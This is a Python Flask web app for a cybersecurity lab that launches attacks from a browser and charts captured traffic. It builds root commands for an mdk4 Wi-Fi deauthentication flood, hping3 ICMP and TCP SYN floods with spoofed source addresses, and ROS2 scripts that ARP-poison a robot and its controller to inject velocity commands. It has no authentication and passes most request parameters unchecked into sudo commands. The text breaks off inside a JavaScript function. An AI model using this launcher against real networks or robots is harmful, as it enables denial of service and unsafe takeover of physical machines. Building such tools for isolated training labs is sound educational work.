#!/usr/bin/env python3
"""
Cybersecurity Capstone Lab - Attack Launcher (Web GUI)
------------------------------------------------------
Run:  python3 lab_attack_gui.py
Open: http://<pi-ip>:5000  from any device on the same network

Dependencies:
    pip install flask --break-system-packages
    sudo apt install tshark -y

Find your Pi's IP with:  hostname -I
Isolated lab environment use only.

Best attacks to capture + visualize: ICMP Flood (Layer 3) or TCP SYN Flood (Layer 4).
Both generate clear packet-rate spikes that graph well. Use Auto-fill Filter before
starting capture, run the attack for 10-30 seconds, stop, then click Analyze.
"""

import json, shlex, subprocess, threading, os, datetime, time
from collections import defaultdict
from flask import Flask, Response, request, stream_with_context, send_file

app = Flask(__name__)

# ── Process state ──────────────────────────────────────────────────────────────
_proc      = None          # attack subprocess
_cap_proc  = None          # tshark capture subprocess
_proc_lock = threading.Lock()
_cap_lock  = threading.Lock()

# ── Capture state ──────────────────────────────────────────────────────────────
_capfile    = None          # full path to current pcap
_tmp_cap    = None          # tshark writes here first (/tmp, AppArmor-safe)
_cap_errors = []            # tshark stderr lines collected after stop

PROTO_MAP = {"1": "ICMP", "6": "TCP", "17": "UDP", "2": "IGMP", "41": "IPv6"}


# ── Attack definitions ─────────────────────────────────────────────────────────
ATTACKS = [
    {
        "id": "monitor", "label": "Wi-Fi Monitor (airodump-ng)",
        "description": "Passively captures 802.11a traffic. Adjust channel, band, and optionally save a pcap.",
        "category": "Passive / Recon", "color": "#2ecc71",
        "params": [
            {"id": "interface", "label": "Interface",   "type": "text",   "default": "wlan0"},
            {"id": "channel",   "label": "Channel",     "type": "number", "default": "36",
             "min": 1, "max": 165, "hint": "Ch 36–165 = 5 GHz · Ch 1–13 = 2.4 GHz"},
            {"id": "band", "label": "Band", "type": "select", "default": "a",
             "options": [{"value":"a","label":"5 GHz (a)"},{"value":"bg","label":"2.4 GHz (bg)"},
                         {"value":"abg","label":"Dual Band (abg)"}]},
            {"id": "save_cap", "label": "Save capture to file", "type": "checkbox", "default": False},
            {"id": "outfile", "label": "Output file prefix", "type": "text",
             "default": "capture", "hint": "Written to current directory",
             "depends_on": {"save_cap": True}},
        ],
    },
    {
        "id": "deauth", "label": "Deauth Flood (mdk4)",
        "description": "Sends 802.11 deauth frames to kick clients off the target SSID.",
        "category": "Layer 2 / DoS", "color": "#e67e22",
        "params": [
            {"id": "interface", "label": "Interface",   "type": "text",   "default": "wlan0"},
            {"id": "ssid",      "label": "Target SSID", "type": "text",   "default": "RaspAP",
             "required": True},
            {"id": "speed", "label": "Packets/sec", "type": "number", "default": "0",
             "min": 0, "max": 1000, "hint": "0 = unlimited"},
        ],
    },
    {
        "id": "icmp_flood", "label": "ICMP Flood — hping3 (Layer 3)",
        "description": "Layer 3 ICMP flood with randomised source IPs. Best attack for visualization — generates clear pps spikes.",
        "category": "Layer 3 / DoS", "color": "#e74c3c",
        "params": [
            {"id": "ip",   "label": "Target IP",  "type": "text", "default": "",
             "placeholder": "192.168.x.x", "required": True},
            {"id": "mode", "label": "Send Mode",  "type": "select", "default": "flood",
             "options": [{"value":"flood","label":"Flood — unlimited, max speed"},
                         {"value":"count","label":"Count — fixed packet burst"}]},
            {"id": "count",       "label": "Packet Count", "type": "number",
             "default": "1000", "min": 1, "max": 100000,
             "hint": "Pi 4B advisory max: 100,000", "depends_on": {"mode": "count"}},
            {"id": "interval_us", "label": "Interval (µs)", "type": "number",
             "default": "10000", "min": 0, "max": 1000000,
             "hint": "0 = max speed · 1000 µs = 1 ms", "depends_on": {"mode": "count"}},
        ],
    },
    {
        "id": "tcp_flood", "label": "TCP SYN Flood — hping3 (Layer 4)",
        "description": "Layer 4 TCP SYN flood with randomised source IPs. Also visualizes well — shows SYN packet bursts per second.",
        "category": "Layer 4 / DoS", "color": "#c0392b",
        "params": [
            {"id": "ip",   "label": "Target IP",   "type": "text", "default": "",
             "placeholder": "192.168.x.x", "required": True},
            {"id": "port", "label": "Target Port", "type": "number", "default": "22",
             "min": 1, "max": 65535, "hint": "22=SSH · 80=HTTP · 443=HTTPS"},
            {"id": "mode", "label": "Send Mode",   "type": "select", "default": "flood",
             "options": [{"value":"flood","label":"Flood — unlimited, max speed"},
                         {"value":"count","label":"Count — fixed packet burst"}]},
            {"id": "count",       "label": "Packet Count", "type": "number",
             "default": "1000", "min": 1, "max": 100000,
             "hint": "Pi 4B advisory max: 100,000", "depends_on": {"mode": "count"}},
            {"id": "interval_us", "label": "Interval (µs)", "type": "number",
             "default": "10000", "min": 0, "max": 1000000,
             "hint": "0 = max speed · 1000 µs = 1 ms", "depends_on": {"mode": "count"}},
        ],
    },
    {
        "id": "ros2_mitm", "label": "ROS2 RTPS MitM (NFQueue)",
        "description": "ARP poisons a ROS2 robot and controller, intercepting and modifying RTPS velocity commands in real-time.",
        "category": "Layer 3 / MitM", "color": "#9b59b6",
        "params": [
            {"id": "robot_ip", "label": "Robot IP", "type": "text", "placeholder": "192.168.x.x", "required": True},
            {"id": "controller_ip", "label": "Controller IP", "type": "text", "placeholder": "192.168.x.x", "required": True},
            {"id": "interface", "label": "Interface", "type": "text", "default": "wlan0", "required": True}
        ],
    },
    {
        "id": "ros2_dynamic_mitm", "label": "ROS2 Dynamic MitM (test3)",
        "description": "Dynamically detects RTPS Twist offsets, drops unknown traffic, and injects custom linear/angular velocities.",
        "category": "Layer 3 / MitM", "color": "#9b59b6",
        "params": [
            {"id": "robot_ip", "label": "Robot IP", "type": "text", "placeholder": "192.168.x.x", "required": True},
            {"id": "controller_ip", "label": "Controller IP", "type": "text", "placeholder": "192.168.x.x", "required": True},
            {"id": "interface", "label": "Interface", "type": "text", "default": "wlan0", "required": True},
            {"id": "linear", "label": "Override Linear (m/s)", "type": "number", "default": "0"},
            {"id": "angular", "label": "Override Angular (rad/s)", "type": "number", "default": "0"}
        ],
    },
]
ATTACK_MAP = {a["id"]: a for a in ATTACKS}


# ── Command builder ────────────────────────────────────────────────────────────
def build_command(atk_id, p):
    if atk_id == "monitor":
        cmd = f"sudo airodump-ng -c {p['channel']} {p['interface']} --band {p['band']}"
        if p.get("save_cap") in ("true", "1", "on", "True"):
            cmd += f" -w {p.get('outfile', 'capture')}"
        return cmd
    if atk_id == "deauth":
        cmd = f"sudo mdk4 {p['interface']} d -E {p['ssid']}"
        if p.get("speed", "0") not in ("0", ""):
            cmd += f" -s {p['speed']}"
        return cmd
    if atk_id == "icmp_flood":
        flags = "sudo hping3 -1 --rand-source"
        if p.get("mode") == "count":
            flags += f" -c {p['count']}"
            if p.get("interval_us", "0") not in ("0", ""):
                flags += f" -i u{p['interval_us']}"
        else:
            flags += " --flood"
        return f"{flags} {p['ip']}"
    if atk_id == "tcp_flood":
        flags = f"sudo hping3 -S -p {p.get('port', '22')} --rand-source"
        if p.get("mode") == "count":
            flags += f" -c {p['count']}"
            if p.get("interval_us", "0") not in ("0", ""):
                flags += f" -i u{p['interval_us']}"
        else:
            flags += " --flood"
        return f"{flags} {p['ip']}"
    if atk_id == "ros2_mitm":
        # Make sure the path to nfq_mitm.py is correct for your system!
        return f"sudo python3 /home/kali/Documents/L5/nfq_mitm.py --robot {p['robot_ip']} --controller {p['controller_ip']} --iface {p['interface']}"
    if atk_id == "ros2_dynamic_mitm":
        return f"sudo python3 /home/kali/Documents/L5/test3.py --robot {p['robot_ip']} --controller {p['controller_ip']} --iface {p['interface']} --linear {p.get('linear', '0')} --angular {p.get('angular', '0')}"
    return None


def validate_params(atk_id, p):
    if atk_id == "monitor":
        try:
            c = int(p.get("channel", ""))
            if not (1 <= c <= 165): raise ValueError
        except Exception:
            return "Channel must be 1–165"
    elif atk_id == "deauth":
        if not p.get("ssid", "").strip():
            return "SSID is required"
    elif atk_id in ("icmp_flood", "tcp_flood"):
        ip = p.get("ip", "")
        parts = ip.split(".")
        if len(parts) != 4 or not all(x.isdigit() and 0 <= int(x) <= 255 for x in parts):
            return "Invalid target IP"
        if atk_id == "tcp_flood":
            try:
                port = int(p.get("port", ""))
                if not (1 <= port <= 65535): raise ValueError
            except Exception:
                return "Port must be 1–65535"
        if p.get("mode") == "count":
            try:
                c = int(p.get("count", ""))
                if not (1 <= c <= 100000): raise ValueError
            except Exception:
                return "Count must be 1–100,000"
    elif atk_id == "ros2_mitm":
        for target in ["robot_ip", "controller_ip"]:
            ip = p.get(target, "")
            parts = ip.split(".")
            if len(parts) != 4 or not all(x.isdigit() and 0 <= int(x) <= 255 for x in parts):
                return f"Invalid IP address format for {target.replace('_', ' ')}"
        if not p.get("interface", "").strip():
            return "Interface is required"
    elif atk_id == "ros2_dynamic_mitm":
        for target in ["robot_ip", "controller_ip"]:
            ip = p.get(target, "")
            parts = ip.split(".")
            if len(parts) != 4 or not all(x.isdigit() and 0 <= int(x) <= 255 for x in parts):
                return f"Invalid IP address format for {target.replace('_', ' ')}"
    return None


# ── Routes ─────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return PAGE.replace("__ATTACKS__", json.dumps(ATTACKS))


@app.route("/run")
def run_attack():
    global _proc
    atk = ATTACK_MAP.get(request.args.get("id", ""))
    if not atk:
        return Response("Unknown attack id", status=400)
    p   = dict(request.args)
    err = validate_params(atk["id"], p)
    if err:
        return Response(err, status=400)
    cmd = build_command(atk["id"], p)
    if not cmd:
        return Response("Could not build command", status=500)

    def generate():
        global _proc
        with _proc_lock:
            if _proc and _proc.poll() is None:
                _proc.terminate(); _proc.wait()
            _proc = subprocess.Popen(
                shlex.split(cmd), stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1)
        try:
            for line in _proc.stdout:
                yield f"event: line\ndata: {line.rstrip()}\n\n"
            _proc.wait()
            yield f"event: done\ndata: {_proc.returncode}\n\n"
        except GeneratorExit:
            pass
        finally:
            with _proc_lock:
                if _proc and _proc.poll() is None:
                    _proc.terminate()

    return Response(stream_with_context(generate()), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/stop", methods=["POST"])
def stop_attack():
    global _proc
    with _proc_lock:
        if _proc and _proc.poll() is None:
            _proc.terminate()
    return ("", 204)


@app.route("/capture/start", methods=["POST"])
def capture_start():
    global _cap_proc, _capfile, _tmp_cap, _cap_errors
    data   = request.get_json(silent=True) or {}
    iface  = data.get("interface", "wlan0").strip() or "wlan0"
    filt   = data.get("filter", "").strip()
    capdir = data.get("directory", "/home/kali/Documents/pcapfiles").strip()

    # Verify the directory is writable; fall back to /tmp so capture always works
    try:
        os.makedirs(capdir, exist_ok=True)
        probe = os.path.join(capdir, ".write_probe")
        open(probe, "w").close()
        os.remove(probe)
    except Exception as e:
        capdir = "/tmp"

    ts        = datetime.datetime.now().strftime("%Y%m%d_%H%M")
    _capfile  = os.path.join(capdir, f"guicap_{ts}.pcap")
    _tmp_cap  = f"/tmp/cap_{ts}.pcap"   # tshark writes here (AppArmor allows /tmp)
    _cap_errors = []

    cmd = ["sudo", "tshark", "-i", iface, "-w", _tmp_cap]
    if filt:
        cmd += ["-f", filt]

    with _cap_lock:
        if _cap_proc and _cap_proc.poll() is None:
            _cap_proc.terminate(); _cap_proc.wait()
        # Capture stderr so we can report tshark errors to the user
        _cap_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
        )

    return json.dumps({
        "status": "ok",
        "file":   os.path.basename(_capfile),
        "path":   _capfile,
        "dir":    capdir,
    }), 200, {"Content-Type": "application/json"}


@app.route("/capture/stop", methods=["POST"])
def capture_stop():
    global _cap_proc, _cap_errors
    with _cap_lock:
        if _cap_proc and _cap_proc.poll() is None:
            _cap_proc.terminate()
            # Read any stderr tshark emitted — this is how we see errors
            try:
                stderr_out = _cap_proc.stderr.read()
                _cap_errors = [l for l in stderr_out.splitlines() if l.strip()]
            except Exception:
                _cap_errors = []
            _cap_proc.wait()
        # tshark writes as root — make it readable by the current user
        if _capfile and os.path.exists(_tmp_cap):
            subprocess.run(["sudo", "chmod", "644", _tmp_cap])
            subprocess.run(["sudo", "mv", _tmp_cap, _capfile])
    return json.dumps({"errors": _cap_errors}), 200, {"Content-Type": "application/json"}


@app.route("/capture/check")
def capture_check():
    """Debug endpoint — shows exactly what state the capture is in."""
    exists = os.path.exists(_capfile) if _capfile else False
    size   = os.path.getsize(_capfile) if exists else 0
    return json.dumps({
        "capfile":  _capfile,
        "exists":   exists,
        "size_bytes": size,
        "running":  _cap_proc is not None and _cap_proc.poll() is None,
        "errors":   _cap_errors,
    }), 200, {"Content-Type": "application/json"}


@app.route("/capture/analyze")
def capture_analyze():
    """
    Run tshark -r on the saved pcap (no sudo needed for reading a file).
    Returns per-second packet/byte counts and protocol totals for charting.
    """
    if not _capfile:
        return Response("No capture has been started this session.", status=404)
    if not os.path.exists(_capfile):
        return Response(
            f"File not found: {_capfile}\n"
            f"tshark errors: {'; '.join(_cap_errors) or 'none recorded'}",
            status=404,
        )
    size = os.path.getsize(_capfile)
    if size == 0:
        return Response(
            f"Capture file is empty (0 bytes). tshark errors: {'; '.join(_cap_errors) or 'none recorded'}",
            status=404,
        )

    try:
        result = subprocess.run(
            ["sudo", "tshark", "-r", _capfile, "-T", "fields",
             "-e", "frame.time_relative", "-e", "frame.len", "-e", "ip.proto", "-n"],
            capture_output=True, text=True, timeout=60,
        )
    except subprocess.TimeoutExpired:
        return Response("Analysis timed out (pcap may be very large).", status=500)
    except FileNotFoundError:
        return Response("tshark not found. Run: sudo apt install tshark", status=500)

    buckets = defaultdict(lambda: {"pkts": 0, "bytes": 0, "protos": defaultdict(int)})
    for line in result.stdout.splitlines():
        parts = line.split("\t")
        try:
            sec    = int(float(parts[0]))
            length = int(parts[1]) if len(parts) > 1 and parts[1] else 0
            proto  = PROTO_MAP.get(parts[2].strip() if len(parts) > 2 else "", "Other")
        except (ValueError, IndexError):
            continue
        buckets[sec]["pkts"]  += 1
        buckets[sec]["bytes"] += length
        buckets[sec]["protos"][proto] += 1

    keys = sorted(buckets.keys())
    # Normalise labels to 0-based seconds
    labels = [k - keys[0] for k in keys] if keys else []

    proto_totals: dict = defaultdict(int)
    for b in buckets.values():
        for k, v in b["protos"].items():
            proto_totals[k] += v

    total_pkts  = sum(b["pkts"]  for b in buckets.values())
    total_bytes = sum(b["bytes"] for b in buckets.values())
    peak_pps    = max((b["pkts"] for b in buckets.values()), default=0)

    return json.dumps({
        "labels":       labels,
        "pps":          [buckets[k]["pkts"]  for k in keys],
        "bps":          [buckets[k]["bytes"] for k in keys],
        "protos":       dict(proto_totals),
        "total_packets": total_pkts,
        "total_bytes":  total_bytes,
        "peak_pps":     peak_pps,
        "duration_s":   (keys[-1] - keys[0] + 1) if keys else 0,
        "file":         os.path.basename(_capfile),
    }), 200, {"Content-Type": "application/json"}


@app.route("/capture/download")
def capture_download():
    if not _capfile:
        return Response(
            "No capture has been started this session. Start and stop a capture first.",
            status=404,
        )
    if not os.path.exists(_capfile):
        return Response(
            f"File not found at: {_capfile}\n"
            f"tshark stderr: {chr(10).join(_cap_errors) or '(none — tshark may have failed silently)'}",
            status=404,
        )
    if os.path.getsize(_capfile) == 0:
        return Response(
            f"Capture file exists but is 0 bytes: {_capfile}\n"
            f"tshark stderr: {chr(10).join(_cap_errors) or '(none)'}",
            status=404,
        )
    return send_file(_capfile, as_attachment=True,
                     download_name=os.path.basename(_capfile))


# ── HTML / CSS / JS ────────────────────────────────────────────────────────────
PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Lab Attack Launcher</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@600;700&display=swap');
  :root{
    --bg:#0d0d1a; --surface:#12122a; --surface2:#0f0f22;
    --border:#1e1e3f; --border2:#252550;
    --accent:#e94560; --green:#2ecc71; --orange:#e67e22; --blue:#3498db;
    --text:#c8d6e5; --muted:#4a5a6a; --hint:#5a7a8a;
    --mono:'Share Tech Mono',monospace; --head:'Rajdhani',sans-serif;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--text);font-family:var(--mono);
       min-height:100vh;display:flex;flex-direction:column;align-items:center;
       padding:28px 16px 60px}
  header{width:100%;max-width:860px;display:flex;align-items:baseline;
         gap:16px;border-bottom:1px solid var(--border);padding-bottom:14px;margin-bottom:22px}
  header h1{font-family:var(--head);font-size:1.75rem;font-weight:700;
            color:var(--accent);letter-spacing:1px}
  header span{font-size:.65rem;color:var(--muted);letter-spacing:3px;text-transform:uppercase}
  .card{background:var(--surface);border:1px solid var(--border);border-radius:7px;
        padding:20px;width:100%;max-width:860px;margin-bottom:14px}
  .card-title{font-size:.62rem;letter-spacing:3px;color:var(--muted);
              text-transform:uppercase;margin-bottom:14px}
  .atk-row{display:flex;align-items:center;gap:12px;padding:10px 14px;
           border-radius:5px;border:1px solid transparent;cursor:pointer;
           transition:background .15s,border-color .15s;margin-bottom:5px;user-select:none}
  .atk-row:hover{background:rgba(255,255,255,.025)}
  .atk-row.selected{background:rgba(233,69,96,.08);border-color:rgba(233,69,96,.3)}
  .atk-row input[type=radio]{accent-color:var(--accent);width:14px;height:14px;cursor:pointer;flex-shrink:0}
  .atk-label{flex:1;font-size:.92rem}
  .badge{font-size:.62rem;padding:2px 8px;border-radius:20px;border:1px solid currentColor;white-space:nowrap}
  #desc{font-size:.8rem;color:#7fb4d4;font-style:italic;margin-top:10px;
        padding:8px 14px;background:rgba(127,180,212,.05);border-radius:4px;
        border-left:2px solid #7fb4d455}
  .param-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
  .param-field{display:flex;flex-direction:column;gap:5px}
  .param-field.hidden{display:none}
  .param-field > label{font-size:.62rem;letter-spacing:2px;color:var(--muted);text-transform:uppercase}
  .hint{font-size:.63rem;color:var(--hint);margin-top:1px}
  input[type=text],input[type=number],select{
    background:var(--surface2);border:1px solid var(--border2);border-radius:4px;
    color:var(--text);font-family:var(--mono);font-size:.88rem;
    padding:7px 10px;width:100%;outline:none;transition:border-color .2s}
  input[type=text]:focus,input[type=number]:focus,select:focus{border-color:var(--accent)}
  input[type=text]:disabled,input[type=number]:disabled,select:disabled{opacity:.3;cursor:not-allowed}
  select option{background:var(--surface)}
  .checkbox-row{display:flex;align-items:center;gap:9px;padding:5px 0}
  .checkbox-row input[type=checkbox]{accent-color:var(--accent);width:15px;height:15px;cursor:pointer}
  .checkbox-row span{font-size:.85rem}
  #preview{background:#06060f;border-left:3px solid var(--green);padding:9px 14px;
           font-size:.78rem;color:var(--green);border-radius:0 4px 4px 0;
           word-break:break-all;min-height:2.2em;margin-top:14px;white-space:pre-wrap}
  .cap-row{display:flex;align-items:flex-end;gap:10px;flex-wrap:wrap;margin-bottom:10px}
  .cap-field{display:flex;flex-direction:column;gap:5px}
  .cap-field label{font-size:.62rem;letter-spacing:2px;color:var(--muted);text-transform:uppercase}
  .cap-field.wide input{width:240px}
  .btn-row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  button{font-family:var(--mono);font-size:.85rem;padding:8px 20px;border:none;
         border-radius:4px;cursor:pointer;font-weight:bold;letter-spacing:1px;
         transition:opacity .15s,background .15s,color .15s}
  button:disabled{opacity:.3;cursor:not-allowed}
  .btn-run{background:var(--accent);color:#fff}
  .btn-run:hover:not(:disabled){background:#c0392b}
  .btn-stop{background:#1a1a38;color:#666;border:1px solid #2a2a4a}
  .btn-stop.active{background:#c0392b;color:#fff;border-color:#c0392b}
  .btn-cap{background:#1a2a1a;color:#5a9a5a;border:1px solid #2a4a2a}
  .btn-cap.active{background:var(--green);color:#000;border-color:var(--green)}
  .btn-auto{background:#1a1a2a;color:#7a8aaa;border:1px solid var(--border2);font-size:.75rem;padding:8px 12px}
  .btn-auto:hover:not(:disabled){border-color:var(--blue);color:var(--blue)}
  .btn-dl{background:#1a2535;color:var(--blue);border:1px solid #2a3a50}
  .btn-dl:hover:not(:disabled){background:#1e3a5a}
  .btn-analyze{background:#1a1535;color:#9b7fd4;border:1px solid #2a2050}
  .btn-analyze:hover:not(:disabled){background:#2a1a55;color:#c39ef4}
  #atk-status,#cap-status-txt{margin-left:auto;font-size:.75rem;color:var(--muted)}
  /* analysis results */
  #analysis-card{display:none}
  .summary-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:16px}
  .sum-box{background:#06060f;border:1px solid var(--border);border-radius:5px;
           padding:12px 8px;text-align:center}
  .sum-val{font-family:var(--head);font-size:1.35rem;font-weight:700;
           color:var(--accent);letter-spacing:1px}
  .sum-val.green{color:var(--green)}
  .sum-val.blue{color:var(--blue)}
  .sum-val.orange{color:var(--orange)}
  .sum-lbl{font-size:.58rem;color:var(--muted);letter-spacing:2px;
           text-transform:uppercase;margin-top:4px}
  .charts-grid{display:grid;grid-template-columns:2fr 1fr;gap:14px}
  .chart-wrap{position:relative;height:220px;background:#06060f;
              border:1px solid var(--border);border-radius:5px;padding:10px}
  .chart-label{font-size:.6rem;letter-spacing:2px;color:var(--muted);
               text-transform:uppercase;margin-bottom:6px}
  #no-protos{font-size:.8rem;color:var(--muted);text-align:center;
             padding-top:60px;font-style:italic}
  #log{background:#05050e;border-radius:5px;padding:12px;font-size:.77rem;
       line-height:1.65;height:300px;overflow-y:auto;color:#a8d5a2;
       white-space:pre-wrap;word-break:break-all}
  .li{color:#80cbc4} .lw{color:#ffe082} .le{color:#ef9a9a}
  ::-webkit-scrollbar{width:5px}
  ::-webkit-scrollbar-track{background:transparent}
  ::-webkit-scrollbar-thumb{background:#2a2a4a;border-radius:3px}
  @media(max-width:600px){
    .summary-grid{grid-template-columns:repeat(2,1fr)}
    .charts-grid{grid-template-columns:1fr}
    .chart-wrap{height:180px}
  }
</style>
</head>
<body>

<header>
  <h1>&#9889; Lab Attack Launcher</h1>
  <span>Isolated Lab &middot; Authorised Use Only</span>
</header>

<!-- Attack selector -->
<div class="card">
  <div class="card-title">Select Attack</div>
  <div id="atk-list"></div>
  <div id="desc"></div>
</div>

<!-- Parameters -->
<div class="card">
  <div class="card-title">Parameters</div>
  <div id="param-grid" class="param-grid"></div>
  <div id="preview"></div>
</div>

<!-- Packet capture -->
<div class="card">
  <div class="card-title">Packet Capture (tshark)</div>
  <div class="cap-row">
    <div class="cap-field">
      <label>Interface</label>
      <input type="text" id="cap-iface" value="wlan0" style="width:100px">
    </div>
    <div class="cap-field wide">
      <label>BPF Filter</label>
      <input type="text" id="cap-filter" placeholder="e.g. icmp and host 192.168.x.x">
    </div>
    <button class="btn-auto" onclick="autoFilter()">&#9881; Auto-fill</button>
  </div>
  <div class="cap-row">
    <div class="cap-field" style="flex:1">
      <label>Save Directory</label>
      <input type="text" id="cap-dir" value="/home/kali/Documents/pcapfiles"
             style="width:100%" placeholder="/home/kali/Documents/pcapfiles">
    </div>
  </div>
  <div class="btn-row" style="margin-top:4px">
    <button id="cap-start-btn" class="btn-cap"  onclick="capStart()">&#9679; Start Capture</button>
    <button id="cap-stop-btn"  class="btn-stop" onclick="capStop()"  disabled>&#9632; Stop</button>
    <button id="cap-analyze-btn" class="btn-analyze" onclick="capAnalyze()" disabled>&#9998; Analyze</button>
    <button id="cap-dl-btn"    class="btn-dl"   onclick="capDownload()" disabled>&#11015; Download .pcap</button>
    <span id="cap-status-txt">&#9679; IDLE</span>
  </div>
  <div style="margin-top:8px;font-size:.68rem;color:var(--hint)">
    Tip: use <strong>ICMP Flood</strong> or <strong>TCP SYN Flood</strong> for best visualization results.
    Auto-fill generates the BPF filter from your current attack params.
    If the directory is not writable, capture falls back to /tmp automatically.
  </div>
</div>

<!-- Attack controls -->
<div class="card">
  <div class="btn-row">
    <button id="run-btn"  class="btn-run"  onclick="runAttack()">&#9654; Run Attack</button>
    <button id="stop-btn" class="btn-stop" onclick="stopAttack()" disabled>&#9632; Stop Attack</button>
    <span id="atk-status">&#9679; IDLE</span>
  </div>
</div>

<!-- Analysis results (shown after Analyze is clicked) -->
<div class="card" id="analysis-card">
  <div class="card-title" id="analysis-title">Analysis Results</div>
  <div class="summary-grid">
    <div class="sum-box"><div class="sum-val"        id="s-pkts">—</div><div class="sum-lbl">Total Packets</div></div>
    <div class="sum-box"><div class="sum-val green"  id="s-bytes">—</div><div class="sum-lbl">Total Data</div></div>
    <div class="sum-box"><div class="sum-val blue"   id="s-peak">—</div><div class="sum-lbl">Peak pkt/s</div></div>
    <div class="sum-box"><div class="sum-val orange" id="s-dur">—</div><div class="sum-lbl">Duration</div></div>
  </div>
  <div class="charts-grid">
    <div class="chart-wrap">
      <div class="chart-label">Packets per Second</div>
      <canvas id="line-chart"></canvas>
    </div>
    <div class="chart-wrap">
      <div class="chart-label">Protocol Breakdown</div>
      <canvas id="doughnut-chart" style="display:none"></canvas>
      <div id="no-protos">No IP protocol data<br>(layer 2 capture or no IP traffic)</div>
    </div>
  </div>
</div>

<!-- Output log -->
<div class="card">
  <div class="card-title">Output Log</div>
  <div id="log"></div>
</div>

<script>
const ATTACKS = __ATTACKS__;
const AMAP    = Object.fromEntries(ATTACKS.map(a => [a.id, a]));
let   current = ATTACKS[0].id;
let   lineChart, doughnutChart;

// ── Attack selector ───────────────────────────────────────────────────────────
function buildList() {
  const container = document.getElementById('atk-list');
  ATTACKS.forEach((atk, i) => {
    const row = document.createElement('label');
    row.className = 'atk-row' + (i === 0 ? ' selected' : '');
    row.id = 'row-' + atk.id;
    row.innerHTML =
      '<input type="radio" name="atk" value="' + atk.id + '"' + (i===0?' checked':'') + '>' +
      '<span class="atk-label">' + atk.label + '</span>' +
      '<span class="badge" style="color:' + atk.color + '">' + atk.category + '</span>';
    row.addEventListener('click', () => selectAttack(atk.id));
    container.appendChild(row);
  });
}

function selectAttack(id) {
  current = id;
  document.querySelectorAll('.atk-row').forEach(r => r.classList.remove('selected'));
  document.getElementById('row-' + id).classList.add('selected');
  document.querySelector('input[value="' + id + '"]').checked = true;
  document.getElementById('desc').textContent = AMAP[id].description;
  buildParams(AMAP[id]);
}

// ── Param form ────────────────────────────────────────────────────────────────
function buildParams(atk) {
  const grid = document.getElementById('param-grid');
  grid.innerHTML = '';
  atk.params.forEach(p => {
    const wrap = document.createElement('div');
    wrap.className = 'param-field';
    wrap.id = 'pf-' + p.id;
    if (p.type === 'checkbox') {
      wrap.innerHTML =
        '<div class="checkbox-row">' +
          '<input type="checkbox" id="p-' + p.id + '"' + (p.default ? ' checked' : '') +
          ' onchange="onParamChange()">' +
          '<span>' + p.label + '</span>' +
        '</div>' + (p.hint ? '<div class="hint">' + p.hint + '</div>' : '');
    } else if (p.type === 'select') {
      const opts = p.options.map(o =>
        '<option value="' + o.value + '"' + (o.value===p.default?' selected':'') + '>' + o.label + '</option>'
      ).join('');
      wrap.innerHTML =
        '<label for="p-' + p.id + '">' + p.label + '</label>' +
        '<select id="p-' + p.id + '" onchange="onParamChange()">' + opts + '</select>' +
        (p.hint ? '<div class="hint">' + p.hint + '</div>' : '');
    } else {
      const extras =
        (p.min !== undefined ? ' min="' + p.min + '"' : '') +
        (p.max !== undefined ? ' max="' + p.max + '"' : '') +
        (p.placeholder ? ' placeholder="' + p.placeholder + '"' : '') +
        (p.required ? ' required' : '');
      wrap.innerHTML =
        '<label for="p-' + p.id + '">' + p.label +
        (p.required ? ' <span style="color:#e94560">*</span>' : '') + '</label>' +
        '<input type="' + p.type + '" id="p-' + p.id + '" value="' + (p.default||'') + '"' +
        extras + ' oninput="onParamChange()">' +
        (p.hint ? '<div class="hint">' + p.hint + '</div>' : '');
    }
    grid.appendChild(wrap);
  });
  updateDependentFields(atk);
  updatePreview();
}

function updateDependentFields(atk) {
  atk.params.forEach(p => {
    if (!p.depends_on) return;
    const wrap = document.getElementById('pf-' + p.id);
    if (!wrap) return;
    const [depId, depVal] = Object.entries(p.depends_on)[0];
    const depEl = document.getElementById('p-' + depId);
    if (!depEl) return;
    const cur = depEl.type === 'checkbox' ? depEl.checked : depEl.value;
    wrap.classList.toggle('hidden',
      typeof depVal === 'boolean' ? cur !== depVal : String(cur) !== String(depVal));
  });
}

function onParamChange() { updateDependentFields(AMAP[current]); updatePreview(); }

function collectParams(atk) {
  const vals = {};
  atk.params.forEach(p => {
    const el = document.getElementById('p-' + p.id);
    if (!el) return;
    vals[p.id] = p.type === 'checkbox' ? el.checked : el.value.trim();
  });
  return vals;
}

function buildCmd(atk, vals) {
  const id = atk.id;
  if (id === 'monitor') {
    let c = 'sudo airodump-ng -c '+(vals.channel||'36')+' '+(vals.interface||'wlan0')+' --band '+(vals.band||'a');
    if (vals.save_cap) c += ' -w '+(vals.outfile||'capture');
    return c;
  }
  if (id === 'deauth') {
    let c = 'sudo mdk4 '+(vals.interface||'wlan0')+' d -E '+(vals.ssid||'RaspAP');
    if (vals.speed && vals.speed !== '0') c += ' -s '+vals.speed;
    return c;
  }
  if (id === 'icmp_flood') {
    let f = 'sudo hping3 -1 --rand-source';
    if (vals.mode==='count'){f+=' -c '+(vals.count||'1000');if(vals.interval_us&&vals.interval_us!=='0')f+=' -i u'+vals.interval_us;}
    else f+=' --flood';
    return f+' '+(vals.ip||'<target-ip>');
  }
  if (id === 'tcp_flood') {
    let f = 'sudo hping3 -S -p '+(vals.port||'22')+' --rand-source';
    if (vals.mode==='count'){f+=' -c '+(vals.count||'1000');if(vals.interval_us&&vals.interval_us!=='0')f+=' -i u'+vals.interval_us;}
    else f+=' --flood';
    return f+' '+(vals.ip||'<target-ip>');
  }
  return '';
}

function updatePreview() {
  document.getElementById('preview').textContent = buildCmd(AMAP[current], collectParams(AMAP[current]));
}

// ── Auto-fill BPF filter ──────────────────────────────────────────────────────
function autoFilter() {
